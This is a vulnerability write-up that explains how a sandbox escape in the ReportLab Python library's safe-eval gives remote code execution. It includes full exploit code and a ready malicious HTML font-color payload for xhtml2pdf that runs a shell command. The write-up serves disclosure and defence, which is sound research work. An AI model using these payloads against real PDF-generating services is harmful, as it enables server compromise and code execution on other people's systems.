# CODE INJECTION VULNERABILITY IN REPORTLAB PYTHON LIBRARY

**tl;dr** This write-up details how an RCE in Reportlab - was found and exploited. Due to the prevalence of Reportlab in HTML to PDF processing, this vulnerability may be reachable in many applications that process PDF files, making this an important one to patch and look out for.

# Introduction
A few days ago, during a web application audit we noticed that the application was using the Reportlab python library to perform the dynamic generation of PDF files from HTML input. The Reportlab was found to have a previously patched vulnerability leading to Code execution. which means that finding a bypass to the patch was pretty interesting from the attacker point of view as it would lead to the rediscovery of the code execution, especially the Reportlab library is also used in other applications and tools.

# What is Reportlab
First thing first, a quick recap: Reportlab is an Open Source project that allows the creation of documents in Adobe's Portable Document Format (PDF) using the Python programming language. It also creates charts and data graphics in various bitmap and vector formats as well as PDF.

# Attacking Reportlab
The library has known in 2019 a similar exploit leading to remote code execution via the Color attribute of the HTML tags, the content of the attribute was directly evaluated as a python expression using `eval` function thus leading to code execution. To mitigate the issue Reportlab has implemented a sandbox calling it `rl_safe_eval` that is stripped from all python builtins functions and has multiple overridden builtin functions to permit the execution of the library safe code while stopping any access to dangerous functions and libraries that can subsequently lead to construction of dangerous python code:

An example of this prevention measures is that the builtin `getattr` function is overridden with a restricted function `__rl_getitem__` 
that prohibits access to any dangerous attributes of objects like the ones that start with `__`:

```py
class __RL_SAFE_ENV__(object):
	__time_time__ = time.time
	__weakref_ref__ = weakref.ref
	__slicetype__ = type(slice(0))
	def __init__(self, timeout=None, allowed_magic_methods=None):
		self.timeout = timeout if timeout is not None else self.__rl_tmax__
		self.allowed_magic_methods = (__allowed_magic_methods__ if allowed_magic_methods==True
									else allowed_magic_methods) if allowed_magic_methods else []
		#[...]
		# IN THIS LINE IT CAN BE OBSERVED THAT THE BUILTIN GETATR IS REPLACED WITH A CUSTOM FUNCTION
		# THAT CHECKS THE SAFETY OF THE PASSED ATTRIBUTE NAME BEFORE GETTING IT 
		__rl_builtins__['getattr'] = self.__rl_getattr__
		__rl_builtins__['dict'] = __rl_dict__
		
		#[...]
	def __rl_getattr__(self, obj, a, *args):
		if isinstance(obj, strTypes) and a=='format':
			raise BadCode('%s.format is not implemented' % type(obj))
		# MULTIPLE CHECKS ARE DONE BEFORE FETCHING THE ATTRIBUTE AND RETURNING IT
		# TO THE CALLER IN THE SANDBOXED EVAL ENVIRONMENT 
		self.__rl_is_allowed_name__(a)
		return getattr(obj,a,*args)

	def __rl_is_allowed_name__(self, name):
		"""Check names if they are allowed.
		If ``allow_magic_methods is True`` names in `__allowed_magic_methods__`
		are additionally allowed although their names start with `_`.
		"""
		if isinstance(name,strTypes):
			# NO ACCESS TO ATTRIBUTES STARTING WITH __ OR MATCH A PREDEFINED UNSAFE ATTRIBUTES NAMES
			if name in __rl_unsafe__ or (name.startswith('__')
				and name!='__'
				and name not in self.allowed_magic_methods):
				raise BadCode('unsafe access of %s' % name)
```
# The Bug
The safe eval as described earlier sanitizes the environment from all dangerous functions so that executing code has no access to dangerous tools that can be used to execute malicious actions, however in case a bypass is found to those restrictions and an access to one of the original builtins functions is achieved, it would facilitate greatly the exploitation of the sandboxed environment.

One of the many overridden builtin classes is called `type`, if this class is called with one argument, it returns the type of an object. however in case it is called with three arguments, it returns a new type object. This is essentially a dynamic form of the class statement. In other words it can allow the creation of a new class that inherits from another class.

So the idea here is to create a new class called `Word` that inherits from `str` that when passed to the custom `getattr` it would bypass the checks and would allow the access to sensitive attributes like `__code__`.

Before the custom `getattr` in sandboxed eval returns the attribute it does some checks by calling `__rl_is_allowed_name__` to check the for safety of the called attribute before calling the python builtin `getattr` and returning the result. 
```py
	def __rl_is_allowed_name__(self, name):
		"""Check names if they are allowed.
		If ``allow_magic_methods is True`` names in `__allowed_magic_methods__`
		are additionally allowed although their names start with `_`.
		"""
		if isinstance(name,strTypes):
			if name in __rl_unsafe__ or (name.startswith('__')
				and name!='__'
				and name not in self.allowed_magic_methods):
				raise BadCode('unsafe access of %s' % name)
```

To bypass the `__rl_is_allowed_name__` function, the `Word` class should:
* Always return `False` for calls to function `startswith` to  bypass `(name.startswith('__')`
* Should return `False` to its first call to `__eq__` to bypass the `name in __rl_unsafe__`, after the first call it should return the correct response because when `__eq__` is called by the python builtin `getattr` it should return the correct result.
* the hash should be he same of he hash of its underlying string

The following class fulfills these criteria:
```py
Word = type('Word', (str,), {
            'mutated'   : 1,
            'startswith': lambda self, x: False,
            '__eq__'    : lambda self, x: self.mutate() and self.mutated < 0 and str(self) == x,
            'mutate'    : lambda self: {setattr(self, 'mutated', self.mutated - 1)},
            '__hash__'  : lambda self: hash(str(self))
            })
code = Word('__code__')
print(code == '__code__')    ## prints False
print(code == '__code__')    ## prints True
print(code == '__code__')    ## prints True
print(code == '__code__')    ## prints True

print(code.startswith('__')) ## prints False
```

The custom type function in the safe eval does not allow to be passed three arguments:
```py
	def __rl_type__(self,*args):
		if len(args)==1: return type(*args)
		raise BadCode('type call error')
```
A bypass for this was found by calling type on itself, allowing the retrieval of the original builtin `type` function:
```py
orgTypeFun = type(type(1))
```

combining these two lines of code would give something like this:
```py
orgTypeFun = type(type(1))
Word = orgTypeFun('Word', (str,), {
            'mutated'   : 1,
            'startswith': lambda self, x: False,
            '__eq__'    : lambda self, x: self.mutate() and self.mutated < 0 and str(self) == x,
            'mutate'    : lambda self: {setattr(self, 'mutated', self.mutated - 1)},
            '__hash__'  : lambda self: hash(str(self))
            })
```
# Accessing global builtins

The original exploit has suffered from multiple short comings that made it exploitable only on python 3.10, to solve these issues a new approach has been made to access the `os` python module.

The Reportlab library overides the implementation of multiple builtin functions and inject them as globls into the eval context.

**Example of default builtin overriden by custom functions in rl_safe_eval.py:** 
```py
		__rl_builtins__['getattr'] = self.__rl_getattr__
		__rl_builtins__['dict'] = __rl_dict__
		__rl_builtins__['iter'] = self.__rl_getiter__
		__rl_builtins__['pow'] = self.__rl_pow__
		__rl_builtins__['list'] = self.__rl_list__
		__rl_builtins__['type'] = self.__rl_type__
		__rl_builtins__['max'] = self.__rl_max__
```


Since these functions are contructed in the global context the global variable and moduls can be accessed using the `__globals__` attribute of these custom functions.

***The following code should be executed inside the eval context***
```py
globalOsModule = pow.__globals__['os']
globalOsModule.system('touch /tmp/exploited')
```
# Final Exploit
Now what is left is to write the exploit:

To do this a function will be reconstructed from the bytecode of a compiled one:
```py
orgTypeFun = type(type(1))
Word = orgTypeFun('Word', (str,), {
    'mutated': 1,
            'startswith': lambda self, x: False,
            '__eq__': lambda self, x: self.mutate() and self.mutated < 0 and str(self) == x,
            'mutate': lambda self: {setattr(self, 'mutated', self.mutated - 1)},
            '__hash__': lambda self: hash(str(self))
            })
globalsattr = Word('__globals__')
glbs = getattr(pow,globalsattr)
glbs['os'].system('touch /tmp/exploited')
```

However a multiline expression like this will not be executed in an eval context, to bypass this issue, `list comprehension` trick can be used, something like this:
```py
[print(x) for x in ['hellworld']]
# which would be equivalent to 
x='helloworld'
print(x)


[[ print (x + ' ' + y) for y in ['second var']]  for x in ['first var']]
# which would be equivalent to 
x='first var'
x='second var'
print (x + ' ' + y) 
```

With this technique the exploit code can be rewritten in one line of code like this (this is considered one line x) the multiline here is just formatting to increase readability of the exploit, The declarations should be read from bottom to top x) weird but this is how it works):
```py
[
    [
        getattr(pow, Word('__globals__'))['os'].system('touch /tmp/exploited')
        for Word in [
            orgTypeFun(
                'Word',
                (str,),
                {
                    'mutated': 1,
                    'startswith': lambda self, x: False,
                    '__eq__': lambda self, x: self.mutate()
                    and self.mutated < 0
                    and str(self) == x,
                    'mutate': lambda self: {setattr(self, 'mutated', self.mutated - 1)},
                    '__hash__': lambda self: hash(str(self)),
                },
            )
        ]
    ]
    for orgTypeFun in [type(type(1))]
]
```
# POC
Please refer to the `poc.py` as it contains proof of concept that demonstrates the code execution (upon successful exploitation a file called `exploited` is created in /tmp/ ).

# What Else?
A lot of apps and libraries use the Reportlab library for example xhtml2pdf utility function is vulnerable and can suffer from code execution while transforming malicious HTML to pdf

```sh
cat >mallicious.html <<EOF
<para><font color="[[[getattr(pow, Word('__globals__'))['os'].system('touch /tmp/exploited') for Word in [ orgTypeFun( 'Word', (str,), { 'mutated': 1, 'startswith': lambda self, x: 1 == 0, '__eq__': lambda self, x: self.mutate() and self.mutated < 0 and str(self) == x, 'mutate': lambda self: { setattr(self, 'mutated', self.mutated - 1) }, '__hash__': lambda self: hash(str(self)), }, ) ] ] for orgTypeFun in [type(type(1))] for none in [[].append(1)]]] and 'red'">
                exploit
</font></para>
EOF

xhtml2pdf mallicious.html
ls -al /tmp/exploited
```

# Thanks
I want to thank Matthias Weckbecker for his collaboration and wonderful exchange discussing the shortcomings of the original exploit. Now the exploit works seamlessly on all versions of Python 3 :D
 